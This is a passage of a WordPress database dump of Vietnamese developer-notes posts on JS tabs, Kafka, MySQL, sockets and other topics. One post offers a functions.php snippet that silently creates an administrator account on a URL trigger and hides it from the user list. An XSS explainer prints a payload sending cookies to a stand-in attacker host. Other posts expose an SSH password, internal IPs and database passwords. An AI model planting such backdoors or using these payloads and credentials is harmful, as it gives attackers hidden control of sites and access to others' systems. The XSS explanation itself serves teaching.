</div>\r\n</body>\r\n\r\n</html>\r\n</pre>\r\n\r\n<h2>2. style.scss</h2>\r\n<pre>\r\n.container {\r\n	width: 900px;\r\n}\r\n\r\n.tabs {\r\n	--primary-color: green;\r\n	--danger-color: red;\r\n	--border-color: #ccc;\r\n	width: 100%;\r\n	border: 1px solid var(--border-color);\r\n	.tabs-title {\r\n		width: 100%;\r\n		display: flex;\r\n		border-bottom: 1px solid var(--border-color);\r\n		.tabs-prev {\r\n			border-right: 1px solid var(--border-color);\r\n			padding: 15px 16px;\r\n			cursor: pointer;\r\n			&:hover {\r\n				color: var(--primary-color);\r\n			}\r\n		}\r\n		.tabs-title-wrapper {\r\n			flex: 1;\r\n			position: relative;\r\n			overflow: hidden;\r\n			.tabs-title-contents {\r\n				top: 0;\r\n				left: 0;\r\n				position: absolute;\r\n				display: flex;\r\n				flex-wrap: nowrap;\r\n				transition: 0.5s;\r\n				.tabs-title-item {\r\n					padding: 15px 16px;\r\n					cursor: pointer;\r\n					border-right: 1px solid var(--border-color);\r\n					display: flex;\r\n					align-items: center;\r\n					&.active {\r\n						color: var(--primary-color);\r\n					}\r\n					.tabs-title-item-label {\r\n                        white-space: nowrap;\r\n						&:hover {\r\n							color: var(--primary-color);\r\n						}\r\n					}\r\n					.tabs-title-item-close {\r\n						padding-left: 16px;\r\n						font-size: 0.8rem;\r\n						&:hover {\r\n							color: var(--danger-color);\r\n						}\r\n					}\r\n				}\r\n			}\r\n		}\r\n		.tabs-next {\r\n			border-left: 1px solid var(--border-color);\r\n			padding: 15px 16px;\r\n			cursor: pointer;\r\n			&:hover {\r\n				color: var(--primary-color);\r\n			}\r\n		}\r\n		.tabs-close-all {\r\n			border-left: 1px solid var(--border-color);\r\n			padding: 15px 16px;\r\n			cursor: pointer;\r\n			&:hover {\r\n				color: var(--primary-color);\r\n			}\r\n		}\r\n	}\r\n	.tabs-panel {\r\n		height: 300px;\r\n		padding: 0.5rem 1rem;\r\n	}\r\n}\r\n</pre>\r\n\r\n<h2>3. functions.js</h2>\r\n<pre>\r\nconst dataTabsExample = [\r\n	{\r\n		key: \'i1\',\r\n		label: \'item 1\',\r\n		content: \'<div>This is item 1</div>\',\r\n	},\r\n	{\r\n		key: \'i2\',\r\n		label: \'item 2\',\r\n		content: \'<div>This is item 2</div>\',\r\n	},\r\n	{\r\n		key: \'i3\',\r\n		label: \'item 3\',\r\n		content: \'<div>This is item 3</div>\',\r\n	},\r\n	{\r\n		key: \'i4\',\r\n		label: \'item 4\',\r\n		content: \'<div></div>This is item 4</div>\',\r\n	},\r\n	{\r\n		key: \'i5\',\r\n		label: \'item 5\',\r\n		content: \'<div>This is item 5</div>\',\r\n	},\r\n	{\r\n		key: \'i6\',\r\n		label: \'item 6\',\r\n		content: \'<div>This is item 6</div>\',\r\n	},\r\n	{\r\n		key: \'i7\',\r\n		label: \'item 7\',\r\n		content: \'<div>This is item 7</div>\',\r\n	},\r\n	{\r\n		key: \'i8\',\r\n		label: \'item 8\',\r\n		content: \'<div>This is item 8</div>\',\r\n	},\r\n	{\r\n		key: \'i9\',\r\n		label: \'item 9\',\r\n		content: \'<div>This is item 9</div>\',\r\n	},\r\n	{\r\n		key: \'i10\',\r\n		label: \'item 10\',\r\n		content: \'<div>This is item 10</div>\',\r\n	},\r\n	{\r\n		key: \'i11\',\r\n		label: \'item 11\',\r\n		content: \'<div>This is item 11</div>\',\r\n	},\r\n	{\r\n		key: \'i12\',\r\n		label: \'item 12\',\r\n		content: \'<div>This is item 12</div>\',\r\n	},\r\n]\r\n\r\nclass TabsElement {\r\n	constructor(tabsElement, data) {\r\n		this.tabsElement = tabsElement\r\n		this.tabsTitleContent = this.tabsElement.querySelector(\'.tabs-title-contents\')\r\n		this.tabsPanel = this.tabsElement.querySelector(\'.tabs-panel\')\r\n\r\n		this.currentPagesTab = 0\r\n		this.initial(data)\r\n		this.listenEvent()\r\n	}\r\n\r\n	initial(data) {\r\n		const that = this\r\n		data.forEach(item => that.add(item))\r\n	}\r\n	listenEvent() {\r\n		const that = this\r\n		this.tabsElement.addEventListener(\'click\', e => {\r\n			if (e.target.classList.contains(\'tabs-title-item-label\')) {\r\n				const key = e.target.closest(\'.tabs-title-item\').dataset.tabsKey\r\n				that.active(key)\r\n			}\r\n			if (e.target.closest(\'.tabs-title-item-close\')) {\r\n				const key = e.target.closest(\'.tabs-title-item\').dataset.tabsKey\r\n				that.remove(key)\r\n			}\r\n			if (e.target.classList.contains(\'tabs-close-all\')) {\r\n				that.tabsTitleContent.innerHTML = \'\'\r\n				that.tabsPanel.innerHTML = \'\'\r\n			}\r\n			if (e.target.closest(\'.tabs-prev\')) {\r\n				if (that.currentPagesTab <= 0) return\r\n				that.currentPagesTab--\r\n				that.movePositionPageTabs(that.currentPagesTab)\r\n			}\r\n			if (e.target.closest(\'.tabs-next\')) {\r\n				if (that.currentPagesTab >= that.tabsCreatePage().length - 1) return\r\n				that.currentPagesTab++\r\n				that.movePositionPageTabs(that.currentPagesTab)\r\n			}\r\n		})\r\n	}\r\n	tabsCreatePage() {\r\n		const wrapperWidth = this.tabsElement.querySelector(\'.tabs-title-wrapper\').offsetWidth\r\n		const listPoint = []\r\n		const listTabsTitle = this.tabsElement.querySelectorAll(\'.tabs-title-item\')\r\n\r\n		let tempPlusWidth = 0,\r\n			onWidth = 0,\r\n			pageStart = 0\r\n\r\n		for (let index = 0; index < listTabsTitle.length; index++) {\r\n			let itemWidth = listTabsTitle[index].offsetWidth\r\n\r\n			tempPlusWidth += itemWidth\r\n			onWidth += itemWidth\r\n\r\n			if (tempPlusWidth > wrapperWidth) {\r\n				listPoint.push({\r\n					pageStart,\r\n					pageEnd: index - 1,\r\n					onWidth: onWidth - itemWidth,\r\n				})\r\n				pageStart = index\r\n				tempPlusWidth = itemWidth\r\n			}\r\n			if (index === listTabsTitle.length - 1) {\r\n				listPoint.push({\r\n					pageStart,\r\n					pageEnd: index,\r\n					onWidth,\r\n				})\r\n			}\r\n		}\r\n		return listPoint\r\n	}\r\n	movePositionPageTabs(indexPage) {\r\n		const wrapperWidth = this.tabsElement.querySelector(\'.tabs-title-wrapper\').offsetWidth\r\n		if (indexPage == 0) {\r\n			this.tabsTitleContent.style.left = \'0px\'\r\n		}\r\n		if (indexPage != 0) {\r\n			this.tabsTitleContent.style.left =\r\n				wrapperWidth - this.tabsCreatePage()[indexPage].onWidth + \'px\'\r\n		}\r\n	}\r\n	add({ key, label, content }) {\r\n		this.tabsTitleContent.innerHTML += `<div class=&quot;tabs-title-item&quot; data-tabs-key=&quot;${key}&quot;>\r\n                <div class=&quot;tabs-title-item-label&quot;>${label}</div>\r\n                <div class=&quot;tabs-title-item-close&quot;><i class=&quot;fas fa-times&quot;></i></div>\r\n            </div>`\r\n		this.tabsPanel.innerHTML += `<div class=&quot;tabs-panel-item&quot; data-tabs-key=&quot;${key}&quot;>${content}</div>`\r\n	}\r\n	active(key) {\r\n		const listTitleItem = this.tabsElement.querySelectorAll(\'.tabs-title-item\')\r\n		for (let i = 0; i < listTitleItem.length; i++) {\r\n			listTitleItem[i].classList.remove(\'active\')\r\n		}\r\n		const listPanelItem = this.tabsElement.querySelectorAll(\'.tabs-panel-item\')\r\n		for (let i = 0; i < listPanelItem.length; i++) {\r\n			listPanelItem[i].style.display = \'none\'\r\n		}\r\n		this.tabsElement\r\n			.querySelector(`div.tabs-title-item[data-tabs-key=\'${key}\']`)\r\n			.classList.add(\'active\')\r\n		this.tabsElement.querySelector(\r\n			`div.tabs-panel-item[data-tabs-key=\'${key}\']`,\r\n		).style.display = \'\'\r\n	}\r\n	remove(key) {\r\n		this.tabsElement.querySelector(`.tabs-panel-item[data-tabs-key=\'${key}\']`).remove()\r\n		this.tabsElement.querySelector(`.tabs-title-item[data-tabs-key=\'${key}\']`).remove()\r\n	}\r\n}\r\n\r\nwindow.addEventListener(\'load\', () => {\r\n	new TabsElement(document.getElementById(\'tabs-example\'), dataTabsExample)\r\n})\r\n</pre>\r\n', 'Create Tabs by Javascript', '', 'publish', 'open', 'open', '', 'create-tabs-by-javascript', '', '', '2021-12-14 15:01:53', '2021-12-14 15:01:53', '', 0, 'https://duycode.com/?p=1952', 0, 'post', '', 0),
(1954, 1, '2021-12-12 10:56:37', '2021-12-12 10:56:37', '<h2>1. Bật chế độ sửa lỗi </h2>\r\n-- Sửa file: /wp-config.php\r\n<pre>\r\ndefine( \'WP_DEBUG\', true );\r\ndefine( \'WP_DEBUG_LOG\', true );\r\ndefine( \'WP_DEBUG_DISPLAY\', true );\r\n</pre>\r\n\r\n<h2>2. Add User by functions.php</h2>\r\n- Thêm đoạn code sau vào functions.php\r\n<pre>\r\nadd_action(\'wp_head\', \'yourbackdoor\');\r\nfunction yourbackdoor() {\r\n    if (isset($_REQUEST[\'go\']) && $_REQUEST[\'go\'] == \'backdoor\' ) {\r\n        require(\'wp-includes/registration.php\');\r\n        if (!username_exists(\'dtd_backdoor\')) {\r\n            $user_id = wp_create_user(\'dtd_backdoor\', \'dtd_backdoor\');\r\n            $user = new WP_User($user_id);\r\n            $user->set_role(\'administrator\');\r\n        }\r\n    }\r\n}\r\n\r\nadd_action(\'pre_user_query\', \'yoursite_pre_user_query\');\r\nfunction yoursite_pre_user_query($user_search) {\r\n    global $current_user;\r\n    $username = $current_user->user_login;\r\n\r\n    if ($username != \'123\') {\r\n        global $wpdb;\r\n        $user_search->query_where = str_replace(\r\n            \'WHERE 1=1\',\r\n            \"WHERE 1=1 AND {$wpdb->users}.user_login != \'dtd_backdoor\'\",\r\n            $user_search->query_where\r\n        );\r\n    }\r\n}\r\n</pre>\r\nGiờ chỉ cần vào link: https://duycode.com/?go=backdoor ==> đã tạo được tài khoản dtd_backdoor rồi\r\n\r\n<h2>3. Quản lý số lần login</h2>\r\n<pre>\r\n<?php\r\n\r\nif (!class_exists(\'Login_Manager\')) {\r\n    class Login_Manager {\r\n        var $failed_login_limit = 3;                    // Số lần login thất bại\r\n        var $lockout_duration   = 60 * 30;              // Thòi gian cấm login tính theo giây.\r\n        var $transient_name     = \'attempted_login\';    // Tên lưu cache\r\n\r\n        public function __construct() {\r\n            add_filter(\'authenticate\', array($this, \'check_attempted_login\'), 30, 3);\r\n            add_action(\'wp_login_failed\', array($this, \'login_failed\'), 10, 1);\r\n        }\r\n\r\n        public function check_attempted_login($user, $username, $password) {\r\n            if (get_transient($this->transient_name)) {\r\n                $datas = get_transient($this->transient_name);\r\n\r\n                // Lỗi nếu số lần thất bại lớn hơn số lần đã quy định \r\n                if ($datas[\'tried\'] >= $this->failed_login_limit) {\r\n                    $until = get_option(\'_transient_timeout_\' . $this->transient_name);\r\n                    $time = $this->when($until);\r\n                    return new WP_Error(\'too_many_tried\', sprintf(__(\'<strong>Error</strong>: Too many failed login attempts. Please try again in %1$s.\'), $time));\r\n                }\r\n            }\r\n            return $user;\r\n        }\r\n\r\n\r\n        public function login_failed($username) {\r\n            // Bật lại đoạn sau nếu cần reset lại cache\r\n            // set_transient($this->transient_name, [\'tried\' => 1], $this->lockout_duration);\r\n\r\n            if (get_transient($this->transient_name)) {\r\n                $datas = get_transient($this->transient_name);\r\n\r\n                // Nếu số lần thất bại chưa đủ sẽ được cập nhật\r\n                if ($datas[\'tried\'] < $this->failed_login_limit) {\r\n                    $datas[\'tried\']++;\r\n                    set_transient($this->transient_name, $datas, $this->lockout_duration);\r\n                }\r\n            } else {\r\n                set_transient($this->transient_name, [\'tried\' => 1], $this->lockout_duration);\r\n            }\r\n        }\r\n\r\n        /**\r\n         * Return difference between 2 given dates\r\n         * @param  int      $time   Date as Unix timestamp\r\n         * @return string           Return string\r\n         */\r\n        private function when($time) {\r\n            if (!$time)\r\n                return;\r\n            $diff = abs(time() - $time);\r\n            $second = 1;\r\n            $minute = $second * 60;\r\n            $hour = $minute * 60;\r\n            $day = $hour * 24;\r\n            if ($diff < $minute)\r\n                return $diff . \' seconds\';\r\n            if ($diff < $hour)\r\n                return ceil($diff / $minute) . \' minutes\';\r\n            if ($diff < $day)\r\n                return ceil($diff / $hour) . \' hours\';\r\n            return ceil($diff / $day) . \' days\';\r\n        }\r\n    }\r\n}\r\n\r\nnew Login_Manager();\r\n\r\n</pre>\r\n\r\n\r\n<h2>*. Một số vấn đề khác</h2>\r\n<pre>\r\n// Show $_SERVER\r\nhighlight_string(\"<?php\\n\\$data =\\n\" . var_export($_SERVER, true) . \";\\n?>\");\r\n</pre>\r\n', 'Wordpress - Một số vấn đề', '', 'publish', 'open', 'open', '', 'wordpress-mot-so-van-de', '', '', '2022-07-31 10:37:26', '2022-07-31 10:37:26', '', 0, 'https://duycode.com/?p=1954', 0, 'post', '', 0),
(1981, 1, '2021-12-01 01:00:29', '2021-12-01 01:00:29', '    <script>\r\n        const toggleContent = function (element) {\r\n            const content = element.closest(\'div[data-tag=\"container\"]\').querySelector(\'div[data-tag=\"content\"]\')\r\n            if (content.style.display !== \"none\") content.style.display = \'none\'\r\n            else content.style.display = \'\'\r\n        }\r\n    </script>\r\n<h3>Câu 1. CORS là gì ?</h3>\r\n<div data-tag=\'container\'><button onclick=\"toggleContent(this)\">Show/Hide</button><div style=\"display: none;\" data-tag=\'content\'>\r\n- CORS: <strong>Cross Origin Resource Sharing</strong>\r\n- CORS là một trong những chính sách bảo mật Same Origin Policy, một chính sách bảo mật được cài đặt trên toàn bộ các trình duyệt hiện nay. Chính sách này để ngăn chặn hoặc cho phép việc truy cập tài nguyên từ Orign này đến Origin khác\r\n\r\n<strong>A. Client</strong>\r\n- Khi Client gửi 1 request lên Server. Request này tự động được gắn HTTP Header với thông tin Origin (Thông tin Origin của Client không thể thay đổi được)\r\n- Origin bao gồm 3 thành phần, VD: https://facebook.com:80\r\n + Protocol: http hoặc https\r\n + Domain\r\n + Port\r\n\r\n<strong>A. Server</strong>\r\n- Bên Server cài đặt 3 thành phần: Origin, Methods, Content-Type\r\n- VD: Khi sử dụng NodeJS, cài đặt middleware cho phép truy cập từ mọi nguồn\r\n<pre>\r\napp.use((req, res, next) => {\r\n    res.header(\'Access-Control-Allow-Origin\', \'*\')\r\n    res.header(\'Access-Control-Allow-Methods\', \'GET, POST, PATCH, PUT, DELETE\')\r\n    res.header(\'Access-Control-Allow-Headers\', \'Content-Type\')\r\n    next()\r\n})\r\n</pre>\r\n\r\n<button onclick=\"toggleContent(this)\">Hide</button></div></div>\r\n\r\n<h3>Câu 2. XSS là gì ?</h3>\r\n<div data-tag=\'container\'><button onclick=\"toggleContent(this)\">Show/Hide</button><div style=\"display: none;\" data-tag=\'content\'>\r\n- XSS: Cross Site Scripting\r\n- XSS là 1 dạng tấn công mà hacker chèn mã độc vào các đoạn script để người dùng thực thi phía Client\r\n- Mục đích tấn công: lấy cookies, session, tokens của người dùng => chiếm quyền truy cập của người dùng\r\n\r\n<strong>A. Các dạng tấn công thường thấy</strong>\r\n1. Reflected XSS\r\n- Dạng này thường tấn công 1 người dùng cụ thể\r\n- Hacker gửi cho người dùng URL dạng\r\nhttp://example.com/name=var+i=new+Image;+i.src=\"http://hacker-site.net/\"%2Bdocument.cookie\r\n--> Sau khi click vào link trên, đoạn script sẽ đc thực hiện, và gửi cookie đến site của hacker\r\nvar i=new Image; i.src=\"http://hacker-site.net/\"+document.cookie;\r\n\r\n2. Stored XSS\r\n- Trong bài viết, hoặc trong 1 comment, hacker đăng bài, trong đó nội dung được kèm theo 1 đoạn script\r\n<pre>\r\n<script type=”text/javascript”>\r\n// Nội dung bài viết\r\nvar test=\'../example.php?cookie_data=\'+escape(document.cookie);\r\n// Nội dung bài viết\r\n</script>\r\n</pre>\r\n- Loại tấn công này, thì cứ khi nào nạn nhân vào đọc bài viết đó thì sẽ thực thi mã độc\r\n\r\n<button onclick=\"toggleContent(this)\">Hide</button></div></div>\r\n\r\n', 'Câu hỏi Web Developer - P1.  bảo mật', '', 'publish', 'open', 'open', '', 'cau-hoi-web-developer-p1-bao-mat', '', '', '2023-06-17 04:34:32', '2023-06-17 04:34:32', '', 0, 'https://duycode.com/?p=1981', 0, 'post', '', 0),
(2000, 1, '2022-01-07 03:53:48', '2022-01-07 03:53:48', '<a href=\"https://kafka.apache.org/quickstart\" rel=\"noopener\" target=\"_blank\">https://kafka.apache.org/quickstart</a>\r\n<h2>1. Config Kafka and Zookeeper</h2>\r\n- Vào ./config\r\n- Sửa zookeeper.properties\r\n<blockquote>dataDir=C:/Apps/kafka_2.12-2.8.0/logs/zookeeper</blockquote>\r\n- Sửa server.properties\r\n<blockquote>\r\nlisteners=PLAINTEXT://localhost:9092\r\n###\r\nlog.dirs=C:/Apps/kafka_2.12-2.8.0/logs/kafka-logs\r\n</blockquote>\r\n\r\n<h2>2. Run Server</h2>\r\n1. Start zookeeper\r\n<blockquote>\r\nbin\\windows\\zookeeper-server-start.bat config\\zookeeper.properties\r\n</blockquote>\r\n-- Có thể lưu lại file zookeeper-run.bat để chạy cho nhanh\r\n<pre>\r\ntitle Zookeeper Server Running ...\r\nrmdir C:\\Apps\\kafka_2.12-2.8.0\\logs /S /Q\r\necho Remove logs done!.\r\ncd C:\\Apps\\kafka_2.12-2.8.0\r\n.\\bin\\windows\\zookeeper-server-start.bat .\\config\\zookeeper.properties\r\npause\r\n</pre>\r\n\r\n2. Start kafka-server\r\n<blockquote>\r\nbin\\windows\\kafka-server-start.bat config\\server.properties\r\n</blockquote>\r\n-- Có thể lưu lại file kafka-run.bat để chạy cho nhanh\r\n<pre>\r\ntitle Kafka Server Running ...\r\ncd C:\\Apps\\kafka_2.12-2.8.0\r\n.\\bin\\windows\\kafka-server-start.bat .\\config\\server.properties\r\npause\r\n</pre>\r\n\r\n3. Show all topics in Zookeeper \r\n<blockquote>\r\nbin\\windows\\kafka-topics.bat --list --zookeeper localhost:2181\r\n</blockquote>\r\n\r\n-- Có thể lưu lại file list-topics-kafka.bat để chạy cho nhanh\r\n<pre>\r\ntitle List Topic Kafka\r\ncd C:\\Apps\\kafka_2.12-2.8.0\r\ncmd /k bin\\windows\\kafka-topics.bat --list --zookeeper localhost:2181\r\n</pre>\r\n\r\n4. Producer send message to topic: \"alarm-unique\"\r\n<blockquote>\r\nbin\\windows\\kafka-console-producer.bat --topic alarm-unique --bootstrap-server localhost:9092\r\n</blockquote>\r\n-- Có thể lưu lại file producer-send-message.bat để chạy cho nhanh\r\n<pre>\r\ntitle Producer Send Message\r\nset /p topic=\"Enter Topic: \"\r\ncd C:\\Apps\\kafka_2.12-2.8.0\r\nbin\\windows\\kafka-console-producer.bat --topic %topic% --bootstrap-server localhost:9092\r\n</pre>', 'Kafka cơ bản', '', 'publish', 'open', 'open', '', 'kafka-co-ban', '', '', '2022-08-20 03:40:05', '2022-08-20 03:40:05', '', 0, 'https://duycode.com/?p=2000', 0, 'post', '', 0),
(2002, 1, '2022-01-10 02:11:53', '2022-01-10 02:11:53', '<h3>1. Covariance - Hiệp phương sai</h3>\r\n<blockquote>Cov (x, y) = SUM [(xi - xm) * (yi - ym)] / (n - 1)\r\n\r\nxi = một giá trị x đã cho trong tập dữ liệu\r\n\r\nxm = giá trị trung bình hoặc trung bình của các giá trị x\r\n\r\nyi = giá trị y trong tập dữ liệu tương ứng với xi\r\n\r\nym = giá trị trung bình hoặc trung bình của các giá trị y\r\n\r\nn = số điểm dữ liệu\r\n</blockquote>\r\n\r\nVí dụ:\r\n<table>\r\n<tbody>\r\n<tr>\r\n<td>x</td>\r\n<td>2</td>\r\n<td>3</td>\r\n<td>2.7</td>\r\n<td>3.2</td>\r\n<td>4.1</td>\r\n</tr>\r\n<tr>\r\n<td>y</td>\r\n<td>10</td>\r\n<td>14</td>\r\n<td>12</td>\r\n<td>15</td>\r\n<td>20</td>\r\n</tr>\r\n<tr>\r\n<td>xm</td>\r\n<td colspan=\"5\">= (2 + 3 + 2.7 + 3.2 + 4.1) / 5 = 15 / 5 = 3</td>\r\n</tr>\r\n<tr>\r\n<td>ym</td>\r\n<td colspan=\"5\">= (10 + 14 + 12 + 15 + 20) / 5 = 71 / 5 = 14.2</td>\r\n</tr>\r\n<tr>\r\n<td>Cov(x,y)</td>\r\n<td colspan=\"5\">= ((2 - xm) x (10 - ym) + (3 - xm) x (14 - ym) + (2.7 - xm) x (12 - ym) +(3.2 - xm) x (15 - ym) + (4.1 - xm) x (20 - ym)) / (5 - 1)<br />= (4.2 + 0 + 0,66 + 0,16 + 6,38) / 4 <br />= 2,85</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n\r\n\r\n\r\n', 'Một số công thức cần biết', '', 'publish', 'open', 'open', '', 'mot-so-cong-thuc-can-biet', '', '', '2022-01-10 02:15:43', '2022-01-10 02:15:43', '', 0, 'https://duycode.com/?p=2002', 0, 'post', '', 0),
(2014, 1, '2022-01-11 09:06:13', '2022-01-11 09:06:13', '<h2> 1. Cài đặt</h2>\r\n1. Cài WSL từ Windows store\r\n2. Cài Ubuntu\r\n3. Dùng PowerSell\r\n\r\n<h2>2. SSH vào server</h2>\r\n- Bật WSL bằng lệnh: wsl\r\n- Dùng ssh connect vào host: 192.168.100.4, với user = apsc, và password = Anw311CT\r\nsshpass -p \"Anw311CT\" ssh -o StrictHostKeyChecking=no apsc@192.168.100.4\r\n\r\n- Hoặc dùng ssh connect vào host: 10.0.46.12, với user = ubuntu, và key là file: ftl_mas.pem\r\nsudo ssh -i /mnt/d/FTLVN/SSH/ftl_key/ftl_mas.pem  -o StrictHostKeyChecking=no ubuntu@10.0.46.12\r\n\r\n- Sau bước này, các thao tác trên powerShell là thao tác với server\r\n\r\n<h2>3. Các bước check logs</h2>\r\n--- Check các con server đang chạy\r\ndocker ps -a\r\n\r\n--- Check 100 lỗi (-f : là real time)\r\nutils/logs.sh alarm 100 -f | grep \'text-search\'\r\n\r\n-- Show các file hiện có\r\nls\r\nls -la\r\n\r\n-- cd vào folder chứa file ghi lỗi\r\ncd container/logs/alarm\r\n\r\n<h2>4. Tìm kiếm: grep, zgrep </h2>\r\n<pre>\r\n$grep -rn \'text-search\' | grep -rn \'text-search-2\' .\r\nr: (recursive: đệ quy) - tìm kiếm cả thư mục con\r\nn: hiển thị số dòng\r\n\r\n$zgrep -n --color=always \'Dog\\|Cat\' *.gz\r\n// *.gz : giải nén tất cả file .gz\r\n// \\| : điều kiện \"OR\"\r\n\r\n$zgrep -n -a --color=always \'Dog\' *.gz | grep \'Cat\'\r\n// Không có điều kiện \"AND\" -> dùng 2 câu lệnh liên tiếp thay thế\r\n</pre>\r\ngrep, zgrep', 'Check Log FTL', '', 'publish', 'open', 'open', '', 'check-log-ftl', '', '', '2022-08-20 03:41:32', '2022-08-20 03:41:32', '', 0, 'https://duycode.com/?p=2014', 0, 'post', '', 0),
(2026, 1, '2022-02-07 06:36:46', '2022-02-07 06:36:46', '<h3>1. Cài đặt bằng Docker compose </h3>\r\n- Tạo file: docker-compose.yml\r\n<pre>\r\nversion: \'3.3\'\r\n\r\nnetworks:\r\n  mh_network:\r\n    driver: bridge\r\n\r\nservices:\r\n  mysql:\r\n    container_name: mhc_mysql\r\n    image: mysql:8.0.31\r\n    restart: always\r\n    networks:\r\n      - mh_network\r\n    command: --default-authentication-plugin=mysql_native_password\r\n    volumes:\r\n      - ./data/mysql:/var/lib/mysql\r\n    environment:\r\n      - MYSQL_ROOT_PASSWORD=medihome2022\r\n      - MYSQL_DATABASE=mh_database\r\n      - MYSQL_USER=medihome\r\n      - MYSQL_PASSWORD=mh123456\r\n    ports:\r\n      - \"7306:3306\"\r\n</pre>\r\n\r\n<h3>2. Run and check MySQL </h3>\r\n<pre>\r\ndocker-compose up -d\r\ndocker exec -it mhc_mysql bash\r\n# mysql -u root -p\r\n// Điền password: medihome2022\r\n> SHOW DATABASES;\r\n</pre>\r\n\r\n3. Tạo 1 databases\r\n<pre>\r\nDROP DATABASE test_db;\r\nCREATE DATABASE IF NOT EXISTS test_db DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;\r\nUSE test_db;\r\n\r\nDROP TABLE IF EXISTS `Categories`;\r\nCREATE TABLE `Categories` (\r\n                              `categoryID` varchar(10) NOT NULL,\r\n                              `categoryName` varchar(100) DEFAULT NULL,\r\n                              `description` varchar(200) DEFAULT NULL\r\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;\r\n\r\nINSERT INTO `Categories` (`categoryID`, `categoryName`, `description`) VALUES\r\n                                                                           (\'C0101\', \'Beverages\', \'Soft drinks, coffees, teas, beers, and ales\'),\r\n                                                                           (\'C0102\', \'Condiments\', \'Sweet and savory sauces, relishes, spreads, and seasonings\'),\r\n                                                                           (\'C0103\', \'Confections\', \'Desserts, candies, and sweet breads\'),\r\n                                                                           (\'C0104\', \'Dairy Products\', \'Cheeses\'),\r\n                                                                           (\'C0105\', \'Grains_Cereals\', \'Breads, crackers, pasta, and cereal\'),\r\n                                                                           (\'C0106\', \'Meat_Poultry\', \'Prepared meats\'),\r\n                                                                           (\'C0107\', \'Produce\', \'Dried fruit and bean curd\'),\r\n                                                                           (\'C0108\', \'Seafood\', \'Seaweed and fish\');\r\n\r\nDROP TABLE IF EXISTS `Products`;\r\nCREATE TABLE `Products` (\r\n                            `productID` varchar(10) NOT NULL,\r\n                            `categoryID` varchar(10) DEFAULT NULL,\r\n                            `productName` varchar(50) DEFAULT NULL,\r\n                            `price` int(11) DEFAULT NULL,\r\n                            `description` varchar(200) DEFAULT NULL\r\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;\r\n\r\n\r\nINSERT INTO `Products` (`productID`, `categoryID`, `productName`, `price`, `description`) VALUES\r\n                                                                                              (\'P0101\', \'C0101\', \'Chai\', 18, \'Good product\'),\r\n                                                                                              (\'P01010\', \'C0104\', \'Ikura\', 31, \'Good\'),\r\n                                                                                              (\'P01011\', \'C0105\', \'Queso Cabrales\', 21, \'Good\'),\r\n                                                                                              (\'P01012\', \'C0105\', \'Queso Manchego La Pastora\', 38, \'Good\'),\r\n                                                                                              (\'P0102\', \'C0101\', \'Chang\', 19, \'best sell product\'),\r\n                                                                                              (\'P0103\', \'C0101\', \'Aniseed Syrup\', 10, \'new produced\'),\r\n                                                                                              (\'P0104\', \'C0102\', \'Chef Anton\\\'s Cajun Seasoning\', 22, \'popular product\'),\r\n(\'P0105\', \'C0102\', \'Chef Anton\\\'s Gumbo Mix\', 21, \'Good For life\'),\r\n                                                                                              (\'P0106\', \'C0103\', \'Grandma\\\'s Boysenberry Spread\', 25, \'Good\'),\r\n(\'P0107\', \'C0103\', \'Uncle Bob\\\'s Organic Dried Pears\', 30, \'Good\'),\r\n                                                                                              (\'P0108\', \'C0103\', \'Northwoods Cranberry Sauce\', 40, \'Good\'),\r\n                                                                                              (\'P0109\', \'C0104\', \'Mishi Kobe Niku\', 97, \'Good\');\r\n\r\nALTER TABLE `Categories` ADD PRIMARY KEY (`categoryID`);\r\n\r\nALTER TABLE `Products` ADD PRIMARY KEY (`productID`);\r\nCOMMIT;\r\n</pre>\r\n\r\n4. Kiểm tra databases\r\n<pre>\r\nSHOW TABLES;\r\nSELECT * FROM Categories;\r\nSELECT * FROM Products;\r\nDESCRIBE Categories;\r\nDESCRIBE Products;\r\n</pre>', 'MySQL - Cài đặt', '', 'publish', 'open', 'open', '', 'mysql-cai-dat', '', '', '2022-11-23 03:37:59', '2022-11-23 03:37:59', '', 0, 'https://duycode.com/?p=2026', 0, 'post', '', 0),
(2032, 1, '2022-02-14 02:48:50', '2022-02-14 02:48:50', '<pre>\r\n//Code socket io\r\nconst server = require(\'http\').Server(app);\r\nconst io = require(\'socket.io\')(server);\r\nserver.listen(port, () => {\r\n	console.log(\'Domain listening at http://localhost:\' + port);\r\n});\r\nio.on(\'connection\', function (socket) {\r\n	console.log(\'Co nguoi ket noi: \' + socket.id);\r\n\r\n	socket.join(\'Nodejs\');\r\n	console.log(socket.adapter.rooms);\r\n\r\n	socket.on(\'disconnect\', function () {\r\n		console.log(socket.id + \': ngat ket noi !!!\');\r\n	});\r\n\r\n	socket.on(\'Client-Send-Data\', function (data) {\r\n		console.log(socket.id + \' vua gui: \' + data);\r\n		//TH1: Gửi tất cả các client\r\n		io.sockets.emit(\'Server-send-data\', data + \'888\');\r\n		//TH2: Gửi lại chính client\r\n		//socket.emit(\'Server-send-data\', data + \'888\');\r\n		//TH3: Gửi tất cả các client trừ chính client gửi\r\n		//socket.broadcast.emit(\'Server-send-data\', data + \'888\');\r\n		//TH4: Gửi tất cả các client trong 1 room nhất định, ví dụ rooms \"NODEJS\"\r\n		io.sockets.in(\'NODEJS\').emit(\'Server-Send-Data\', data + \'888\');\r\n	});\r\n\r\n	socket.on(\'Join-Room\', function (data) {\r\n		//Kiểm tra xem có room chưa, nếu chưa có thì tạo room, có rồi thì join\r\n		socket.join(data);\r\n	});\r\n	socket.on(\'Leave-Room\', function (data) {\r\n		//Thoát room, nếu room còn 0 socket sẽ tự động xóa room\r\n		socket.leave(data);\r\n	});\r\n});\r\n</pre>', 'Socket cơ bản', '', 'publish', 'open', 'open', '', 'socket-co-ban', '', '', '2022-08-20 03:39:55', '2022-08-20 03:39:55', '', 0, 'https://duycode.com/?p=2032', 0, 'post', '', 0),
